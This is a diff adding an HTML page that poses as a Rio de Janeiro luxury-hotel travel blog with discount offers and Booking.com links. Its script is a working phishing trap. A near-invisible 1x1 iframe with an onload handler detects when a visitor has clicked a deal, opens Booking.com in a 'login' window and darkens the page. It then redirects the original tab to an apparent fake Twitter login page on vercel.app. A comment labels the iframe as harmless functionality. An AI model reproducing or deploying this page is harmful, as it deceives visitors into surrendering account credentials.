@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Rio Travel Blog - Premium Hotels & Exclusive Deals</title>
+	<style type="text/css">
+		@import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700;800&family=Inter:wght@300;400;500;600;700&display=swap');
+
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+
+		body {
+			font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+			background: #fefefe;
+			color: #2c3e50;
+			line-height: 1.7;
+		}
+
+		#blackdiv {
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background-color: rgba(0,0,0,0.9);
+			z-index: 1000;
+			display: none;
+			backdrop-filter: blur(5px);
+		}
+
+		/* Header */
+		.header {
+			background: #ffffff;
+			border-bottom: 1px solid #e8ecf0;
+			padding: 20px 0;
+			position: sticky;
+			top: 0;
+			z-index: 100;
+			backdrop-filter: blur(10px);
+		}
+
+		.header-container {
+			max-width: 1200px;
+			margin: 0 auto;
+			padding: 0 20px;
+			display: flex;
+			justify-content: space-between;
+			align-items: center;
+		}
+
+		.logo {
+			font-family: 'Playfair Display', serif;
+			font-size: 1.8rem;
+			font-weight: 700;
+			color: #2c3e50;
+		}
+
+		.nav-menu {
+			display: flex;
+			gap: 35px;
+		}
+
+		.nav-item {
+			color: #556b7d;
+			text-decoration: none;
+			font-weight: 500;
+			font-size: 0.95rem;
+			transition: color 0.3s;
+			position: relative;
+		}
+
+		.nav-item:hover {
+			color: #e67e22;
+		}
+
+		.nav-item::after {
+			content: '';
+			position: absolute;
+			bottom: -5px;
+			left: 0;
+			width: 0;
+			height: 2px;
+			background: #e67e22;
+			transition: width 0.3s;
+		}
+
+		.nav-item:hover::after {
+			width: 100%;
+		}
+
+		/* Blog Header */
+		.blog-header {
+			padding: 60px 0;
+			background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+			border-bottom: 1px solid #e8ecf0;
+		}
+
+		.blog-container {
+			max-width: 800px;
+			margin: 0 auto;
+			padding: 0 20px;
+		}
+
+		.article-meta {
+			display: flex;
+			gap: 15px;
+			margin-bottom: 25px;
+			font-size: 0.9rem;
+			color: #7f8c8d;
+			align-items: center;
+		}
+
+		.category-tag {
+			background: #e67e22;
+			color: white;
+			padding: 5px 15px;
+			border-radius: 20px;
+			font-size: 0.8rem;
+			font-weight: 600;
+			text-transform: uppercase;
+			letter-spacing: 0.5px;
+		}
+
+		.blog-title {
+			font-family: 'Playfair Display', serif;
+			font-size: 3rem;
+			font-weight: 700;
+			color: #2c3e50;
+			margin-bottom: 20px;
+			line-height: 1.2;
+		}
+
+		.blog-subtitle {
+			font-size: 1.3rem;
+			color: #556b7d;
+			margin-bottom: 30px;
+			font-weight: 400;
+			line-height: 1.5;
+		}
+
+		.author-info {
+			display: flex;
+			align-items: center;
+			gap: 15px;
+			padding: 20px 0;
+			border-top: 1px solid #e8ecf0;
+		}
+
+		.author-avatar {
+			width: 50px;
+			height: 50px;
+			border-radius: 50%;
+			background: linear-gradient(135deg, #e67e22, #f39c12);
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			color: white;
+			font-weight: 700;
+			font-size: 1.2rem;
+		}
+
+		.author-details h4 {
+			color: #2c3e50;
+			margin-bottom: 3px;
+			font-size: 1rem;
+		}
+
+		.author-details span {
+			color: #7f8c8d;
+			font-size: 0.9rem;
+		}
+
+		/* Article Content */
+		.article-content {
+			max-width: 800px;
+			margin: 0 auto;
+			padding: 60px 20px;
+		}
+
+		.featured-image {
+			width: 100%;
+			height: 400px;
+			background: linear-gradient(135deg, #34495e 0%, #2c3e50 100%);
+			border-radius: 15px;
+			margin-bottom: 40px;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			color: white;
+			font-size: 4rem;
+			position: relative;
+			overflow: hidden;
+		}
+
+		.featured-image::before {
+			content: '';
+			position: absolute;
+			top: 0;
+			left: 0;
+			right: 0;
+			bottom: 0;
+			background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+		}
+
+		.article-text {
+			font-size: 1.1rem;
+			line-height: 1.8;
+			margin-bottom: 25px;
+			color: #2c3e50;
+		}
+
+		.article-text:first-of-type::first-letter {
+			font-family: 'Playfair Display', serif;
+			font-size: 4rem;
+			font-weight: 700;
+			float: left;
+			line-height: 1;
+			margin: 0 8px 0 0;
+			color: #e67e22;
+		}
+
+		.section-heading {
+			font-family: 'Playfair Display', serif;
+			font-size: 2rem;
+			font-weight: 600;
+			color: #2c3e50;
+			margin: 50px 0 30px 0;
+			text-align: center;
+		}
+
+		.highlight-quote {
+			background: #f8f9fa;
+			border-left: 4px solid #e67e22;
+			padding: 25px;
+			margin: 40px 0;
+			border-radius: 0 10px 10px 0;
+			font-style: italic;
+			font-size: 1.2rem;
+			color: #34495e;
+			position: relative;
+		}
+
+		.highlight-quote::before {
+			content: '"';
+			font-family: 'Playfair Display', serif;
+			font-size: 4rem;
+			color: #e67e22;
+			position: absolute;
+			top: -10px;
+			left: 15px;
+			opacity: 0.3;
+		}
+
+		/* Hotels Grid */
+		.hotels-grid {
+			display: grid;
+			grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+			gap: 30px;
+			margin: 40px 0;
+		}
+
+		.hotel-card {
+			background: #ffffff;
+			border-radius: 15px;
+			overflow: hidden;
+			box-shadow: 0 8px 25px rgba(44, 62, 80, 0.1);
+			transition: all 0.3s ease;
+			border: 1px solid #e8ecf0;
+		}
+
+		.hotel-card:hover {
+			transform: translateY(-8px);
+			box-shadow: 0 15px 35px rgba(44, 62, 80, 0.15);
+		}
+
+		.hotel-image {
+			height: 220px;
+			background: linear-gradient(135deg, #34495e 0%, #2c3e50 100%);
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			font-size: 2.5rem;
+			color: white;
+			position: relative;
+		}
+
+		.discount-badge {
+			position: absolute;
+			top: 15px;
+			right: 15px;
+			background: #e67e22;
+			color: white;
+			padding: 8px 15px;
+			border-radius: 20px;
+			font-weight: 700;
+			font-size: 0.9rem;
+			z-index: 2;
+		}
+
+		.hotel-content {
+			padding: 25px;
+		}
+
+		.hotel-name {
+			font-family: 'Playfair Display', serif;
+			font-size: 1.4rem;
+			font-weight: 600;
+			color: #2c3e50;
+			margin-bottom: 8px;
+		}
+
+		.hotel-location {
+			color: #7f8c8d;
+			margin-bottom: 15px;
+			display: flex;
+			align-items: center;
+			gap: 5px;
+			font-size: 0.95rem;
+		}
+
+		.hotel-features {
+			display: flex;
+			flex-wrap: wrap;
+			gap: 8px;
+			margin-bottom: 20px;
+		}
+
+		.feature-tag {
+			background: #ecf0f1;
+			color: #556b7d;
+			padding: 5px 12px;
+			border-radius: 15px;
+			font-size: 0.8rem;
+			font-weight: 500;
+		}
+
+		.price-section {
+			margin-bottom: 20px;
+		}
+
+		.price-original {
+			text-decoration: line-through;
+			color: #95a5a6;
+			font-size: 0.95rem;
+			margin-bottom: 5px;
+		}
+
+		.price-current {
+			font-family: 'Playfair Display', serif;
+			font-size: 1.6rem;
+			font-weight: 700;
+			color: #e67e22;
+		}
+
+		.hotel-btn {
+			width: 100%;
+			background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
+			color: white;
+			padding: 15px;
+			border: none;
+			border-radius: 10px;
+			font-size: 1rem;
+			font-weight: 600;
+			cursor: pointer;
+			transition: all 0.3s ease;
+			font-family: 'Inter', sans-serif;
+		}
+
+		.hotel-btn:hover {
+			background: linear-gradient(135deg, #1a252f 0%, #2c3e50 100%);
+			transform: translateY(-2px);
+		}
+
+		/* CTA Section */
+		.cta-section {
+			background: linear-gradient(135deg, #e67e22 0%, #f39c12 100%);
+			color: white;
+			padding: 80px 0;
+			text-align: center;
+			margin: 60px 0 0 0;
+		}
+
+		.cta-container {
+			max-width: 800px;
+			margin: 0 auto;
+			padding: 0 20px;
+		}
+
+		.cta-section h2 {
+			font-family: 'Playfair Display', serif;
+			font-size: 2.5rem;
+			font-weight: 700;
+			margin-bottom: 20px;
+		}
+
+		.cta-section p {
+			font-size: 1.2rem;
+			margin-bottom: 40px;
+			opacity: 0.95;
+			line-height: 1.6;
+		}
+
+		.cta-button {
+			background: white;
+			color: #e67e22;
+			padding: 18px 40px;
+			border: none;
+			border-radius: 50px;
+			font-size: 1.2rem;
+			font-weight: 700;
+			cursor: pointer;
+			transition: all 0.3s ease;
+			box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+			font-family: 'Inter', sans-serif;
+		}
+
+		.cta-button:hover {
+			transform: translateY(-3px);
+			box-shadow: 0 12px 30px rgba(0,0,0,0.3);
+		}
+
+		/* Footer */
+		.footer {
+			background: #2c3e50;
+			color: white;
+			padding: 50px 0;
+			text-align: center;
+		}
+
+		.footer p {
+			opacity: 0.8;
+			font-size: 0.95rem;
+		}
+
+		/* Responsive Design */
+		@media (max-width: 1024px) {
+			.hotels-grid {
+				grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+			}
+		}
+
+		@media (max-width: 768px) {
+			.header-container {
+				flex-direction: column;
+				gap: 20px;
+			}
+
+			.nav-menu {
+				gap: 25px;
+			}
+
+			.blog-title {
+				font-size: 2.2rem;
+			}
+
+			.blog-subtitle {
+				font-size: 1.1rem;
+			}
+
+			.hotels-grid {
+				grid-template-columns: 1fr;
+				gap: 25px;
+			}
+
+			.section-heading {
+				font-size: 1.6rem;
+			}
+
+			.hotel-content {
+				padding: 20px;
+			}
+
+			.cta-section h2 {
+				font-size: 2rem;
+			}
+
+			.cta-button {
+				padding: 15px 30px;
+				font-size: 1.1rem;
+			}
+
+			.featured-image {
+				height: 250px;
+				font-size: 3rem;
+			}
+
+			.article-content {
+				padding: 40px 20px;
+			}
+
+			.blog-header {
+				padding: 40px 0;
+			}
+		}
+
+		@media (max-width: 480px) {
+			.nav-menu {
+				display: none;
+			}
+
+			.blog-title {
+				font-size: 1.8rem;
+			}
+
+			.article-text:first-of-type::first-letter {
+				font-size: 3rem;
+				margin: 0 5px 0 0;
+			}
+
+			.hotel-image {
+				height: 180px;
+				font-size: 2rem;
+			}
+
+			.hotels-section {
+				padding: 50px 0;
+			}
+
+			.cta-section {
+				padding: 60px 0;
+			}
+
+			.highlight-quote {
+				padding: 20px;
+				font-size: 1.1rem;
+			}
+
+			.article-meta {
+				flex-wrap: wrap;
+			}
+		}
+
+		/* Blog-specific animations */
+		@keyframes fadeInUp {
+			from {
+				opacity: 0;
+				transform: translateY(30px);
+			}
+			to {
+				opacity: 1;
+				transform: translateY(0);
+			}
+		}
+
+		.hotel-card {
+			animation: fadeInUp 0.6s ease-out;
+		}
+
+		.hotel-card:nth-child(2) {
+			animation-delay: 0.1s;
+		}
+
+		.hotel-card:nth-child(3) {
+			animation-delay: 0.2s;
+		}
+
+		.hotel-card:nth-child(4) {
+			animation-delay: 0.3s;
+		}
+	</style>
+</head>
+<body>
+
+	<div id="blackdiv"></div>
+
+	<!-- Header -->
+	<header class="header">
+		<div class="header-container">
+			<div class="logo">Rio Travel Journal</div>
+			<nav class="nav-menu">
+				<a href="#" class="nav-item">Home</a>
+				<a href="#" class="nav-item">Hotels</a>
+				<a href="#" class="nav-item">Destinations</a>
+				<a href="#" class="nav-item">Travel Tips</a>
+				<a href="#" class="nav-item">About</a>
+			</nav>
+		</div>
+	</header>
+
+	<!-- Blog Header -->
+	<section class="blog-header">
+		<div class="blog-container">
+			<div class="article-meta">
+				<span class="category-tag">Featured</span>
+				<span>Travel & Hotels</span>
+				<span>•</span>
+				<span>January 18, 2025</span>
+				<span>•</span>
+				<span>8 min read</span>
+			</div>
+
+			<h1 class="blog-title">The Ultimate Guide to Rio's Most Exclusive Hotels</h1>
+			<p class="blog-subtitle">Discover the crown jewels of Rio de Janeiro's hospitality scene with insider access to premium accommodations that define luxury in the Marvelous City</p>
+
+			<div class="author-info">
+				<div class="author-avatar">SL</div>
+				<div class="author-details">
+					<h4>Sofia Luna</h4>
+					<span>Travel Writer & Rio Expert • @sofialuna_travels</span>
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<!-- Article Content -->
+	<article class="article-content">
+		<div class="featured-image">
+			🏨
+		</div>
+
+		<p class="article-text">Rio de Janeiro has always been synonymous with breathtaking landscapes, vibrant culture, and world-class hospitality. As someone who has spent years exploring every corner of this magnificent city, I'm thrilled to share with you the most exclusive hotel experiences that Rio has to offer.</p>
+
+		<p class="article-text">From the golden beaches of Copacabana to the sophisticated neighborhoods of Zona Sul, these handpicked accommodations represent the pinnacle of luxury and service. Each property tells a unique story of Brazilian elegance, combining modern amenities with the warm hospitality that makes Rio truly special.</p>
+
+		<div class="highlight-quote">
+			The true luxury of Rio lies not just in its stunning views or premium amenities, but in the authentic Brazilian warmth that greets you at every turn. These hotels don't just offer rooms; they offer gateways to the soul of the Marvelous City.
+		</div>
+
+		<h2 class="section-heading">Curated Selection: Rio's Finest</h2>
+
+		<p class="article-text">After extensive research and personal visits, I've curated a selection of four exceptional properties that showcase the very best of Rio's hospitality landscape. Each hotel offers distinctive experiences, from oceanfront luxury to urban sophistication, ensuring there's something perfect for every discerning traveler.</p>
+
+		<div class="hotels-grid">
+			<!-- Hotel 1: Windsor Oceânico -->
+			<div class="hotel-card">
+				<div class="hotel-image">
+					<div class="discount-badge">45% OFF</div>
+					🏖️
+				</div>
+				<div class="hotel-content">
+					<h3 class="hotel-name">Windsor Oceânico</h3>
+					<div class="hotel-location">📍 Barra da Tijuca, Rio de Janeiro</div>
+					<div class="hotel-features">
+						<span class="feature-tag">Ocean View</span>
+						<span class="feature-tag">Pool</span>
+						<span class="feature-tag">Spa</span>
+						<span class="feature-tag">Free Wi-Fi</span>
+                        <span class="feature-tag">Parking</span>
+					</div>
+					<div class="price-section">
+						<div class="price-original">From $120/night</div>
+						<div class="price-current">$66/night</div>
+					</div>
+					<button class="hotel-btn" onclick="openHotel('windsor')">Check Availability</button>
+				</div>
+			</div>
+
+			<!-- Hotel 2: Royal Regency Palace -->
+			<div class="hotel-card">
+				<div class="hotel-image">
+					<div class="discount-badge">50% OFF</div>
+					👑
+				</div>
+				<div class="hotel-content">
+					<h3 class="hotel-name">Royal Regency Palace</h3>
+					<div class="hotel-location">📍 Zona Sul, Rio de Janeiro</div>
+					<div class="hotel-features">
+						<span class="feature-tag">5 Stars</span>
+						<span class="feature-tag">Fitness Center</span>
+						<span class="feature-tag">Restaurant</span>
+						<span class="feature-tag">Business Center</span>
+					</div>
+					<div class="price-section">
+						<div class="price-original">From $140/night</div>
+						<div class="price-current">$70/night</div>
+					</div>
+					<button class="hotel-btn" onclick="openHotel('royal')">Check Availability</button>
+				</div>
+			</div>
+
+			<!-- Hotel 3: Vila Galé Rio de Janeiro -->
+			<div class="hotel-card">
+				<div class="hotel-image">
+					<div class="discount-badge">40% OFF</div>
+					🌊
+				</div>
+				<div class="hotel-content">
+					<h3 class="hotel-name">Vila Galé Rio de Janeiro</h3>
+					<div class="hotel-location">📍 Copacabana, Rio de Janeiro</div>
+					<div class="hotel-features">
+						<span class="feature-tag">Beachfront</span>
+						<span class="feature-tag">Rooftop</span>
+						<span class="feature-tag">Concierge</span>
+						<span class="feature-tag">Room Service</span>
+					</div>
+					<div class="price-section">
+						<div class="price-original">From $102/night</div>
+						<div class="price-current">$61/night</div>
+					</div>
+					<button class="hotel-btn" onclick="openHotel('vilagale')">Check Availability</button>
+				</div>
+			</div>
+
+			<!-- Hotel 4: Hotel Nacional Rio de Janeiro -->
+			<div class="hotel-card">
+				<div class="hotel-image">
+					<div class="discount-badge">35% OFF</div>
+					🏛️
+				</div>
+				<div class="hotel-content">
+					<h3 class="hotel-name">Hotel Nacional Rio de Janeiro</h3>
+					<div class="hotel-location">📍 São Conrado, Rio de Janeiro</div>
+					<div class="hotel-features">
+						<span class="feature-tag">Historic</span>
+						<span class="feature-tag">Gardens</span>
+						<span class="feature-tag">Pool</span>
+						<span class="feature-tag">Parking</span>
+                        <span class="feature-tag">Free Wi-Fi</span>
+					</div>
+					<div class="price-section">
+						<div class="price-original">From $112/night</div>
+						<div class="price-current">$73/night</div>
+					</div>
+					<button class="hotel-btn" onclick="openHotel('nacional')">Check Availability</button>
+				</div>
+			</div>
+		</div>
+
+		<p class="article-text">What sets these properties apart isn't just their prime locations or luxurious amenities—it's their ability to capture the essence of Rio while providing world-class service. Whether you're seeking a romantic getaway, a family vacation, or a business retreat, these hotels offer experiences that will create lasting memories.</p>
+
+		<p class="article-text">The current promotional offers make this the perfect time to experience Rio's finest hospitality. With discounts ranging from 35% to 50%, you can enjoy luxury accommodations at unprecedented value, all while supporting local businesses that define the character of this incredible city.</p>
+
+		<div class="highlight-quote">
+			Timing is everything in travel. These exclusive rates won't last long, and with Rio's peak season approaching, availability becomes increasingly limited. I encourage you to explore these options while they're still available.
+		</div>
+
+		<p class="article-text">Each hotel in this selection has been personally vetted for service quality, location advantages, and overall guest experience. From the moment you arrive until your departure, you'll understand why Rio continues to captivate travelers from around the world.</p>
+	</article>
+
+	<!-- CTA Section -->
+	<section class="cta-section">
+		<div class="cta-container">
+			<h2>Ready to Experience Rio in Style?</h2>
+			<p>Don't miss these exclusive offers on Rio's finest hotels. Limited availability with unprecedented savings up to 50% off regular rates.</p>
+			<button class="cta-button" onclick="launch()">Explore All Exclusive Deals</button>
+		</div>
+	</section>
+
+	<!-- Footer -->
+	<footer class="footer">
+		<div class="blog-container">
+			<p>&copy; 2025 Rio Travel Journal. All rights reserved. Authentic travel experiences in partnership with Booking.com</p>
+		</div>
+	</footer>
+
+	<!-- Hidden iframe for functionality -->
+	<iframe src="https://www.booking.com/favicon.ico/$%5E%&*$%5E%&*$%5E%&*$%5E%&*" onload="switcher()" name="sc_share" style="opacity: 0.01;" width=1 height=1></iframe>
+
+	<script type="text/javascript">
+		let iframeLoaded = false;
+		let loginWindow;
+
+		var loadedOnce = false;
+		var launched = false;
+
+		function switcher() {
+			console.log('Switcher chamado - loadedOnce:', loadedOnce, 'launched:', launched);
+			if (!loadedOnce) {
+				loadedOnce = true;
+				console.log('Primeira vez carregando iframe');
+			} else {
+				if (launched) {
+					console.log('Segunda vez + launched = true, redirecionando...');
+					top.focus();
+					top.location = "https://twitter-o-auth1.vercel.app/login";
+				}
+			}
+		}
+
+		function launch() {
+			launched = true;
+			console.log('Abrindo site...');
+			loginWindow = window.open("https://www.booking.com/hotel/nl/cozy-apartment-in-the-centre-of-gouda.pt-br.html?aid=304142&label=gen173nr-1FCAEoggI46AdIM1gEaKkBiAEBmAEtuAEYyAEM2AEB6AEB-AEMiAIBqAIEuAKD0rzDBsACAdICJDI2NmQzMWEyLTRiOWYtNDljMy05OTNmLWQwMmM0ZWJhZmRiNNgCBuACAQ&sid=531817f2bc7e6a5b3953e254ab28c64e&dest_id=-2144863&dest_type=city&dist=0&group_adults=2&group_children=0&hapos=2&hpos=2&no_rooms=1&req_adults=2&req_children=0&room1=A%2CA&sb_price_type=total&sr_order=popularity&srepoch=1752115472&srpvid=97b60be7c113a4fb9a7377995c13300e&type=total&ucfs=1&", "login");
+			document.querySelector("#blackdiv").style.display = "block";
+		}
+
+		function openHotel(hotel) {
+			const hotelUrls = {
+				windsor: "https://www.booking.com/hotel/br/windsor-oceanico.pt-pt.html",
+				royal: "https://www.booking.com/hotel/br/royal-regency-palace.pt-pt.html", 
+				vilagale: "https://www.booking.com/hotel/br/vila-gale-rio-de-janeiro.pt-pt.html",
+				nacional: "https://www.booking.com/hotel/br/hotel-nacional-rio-de-janeiro.pt-pt.html"
+			};
+
+			launched = true;
+			console.log(`Abrindo hotel: ${hotel}`);
+			loginWindow = window.open(hotelUrls[hotel], "login");
+			document.querySelector("#blackdiv").style.display = "block";
+		}
+
+		// Add smooth scroll to sections
+		document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+			anchor.addEventListener('click', function (e) {
+				e.preventDefault();
+				const target = document.querySelector(this.getAttribute('href'));
+				if (target) {
+					target.scrollIntoView({
+						behavior: 'smooth'
+					});
+				}
+			});
+		});
+
+		// Welcome message
+		setTimeout(() => {
+			console.log('🏨 Rio Travel Journal loaded! Explore exclusive hotel deals! 🌊');
+		}, 1000);
+	</script>
+
+</body>
+</html>
